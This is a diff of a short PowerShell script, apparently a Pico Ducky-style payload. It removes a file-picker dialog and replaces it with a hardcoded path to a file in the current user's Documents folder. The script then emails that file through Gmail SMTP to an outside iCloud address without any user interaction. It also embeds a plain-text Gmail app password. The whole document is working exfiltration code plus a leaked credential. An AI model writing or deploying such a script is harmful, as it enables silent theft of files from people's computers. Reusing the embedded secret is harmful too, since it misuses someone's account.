@@ -1,8 +1,5 @@
-Add-Type -AssemblyName System.Windows.Forms
-$File = New-Object System.Windows.Forms.OpenFileDialog
-$File.Title = "Choisissez un fichier à envoyer"
-$null = $File.ShowDialog()
-$Path = $File.FileName
+$UserName = $env:USERNAME
+$Path = "C:\Users\$UserName\Documents\fichier.txt"
 
 $EmailFrom = "picoduckyraspberry@gmail.com"
 $EmailTo = "clement14bs@icloud.com"
@@ -10,7 +7,7 @@ $Subject = "Fichier envoyé via PowerShell"
 $Body = "Voici le fichier demandé."
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = 587
-$Password = "derr olzd bjte tupv"
+$Password = "derr olzd bjte tupv"  # mot de passe d'application Gmail
 
 $Message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo, $Subject, $Body
 $Attachment = New-Object System.Net.Mail.Attachment $Path
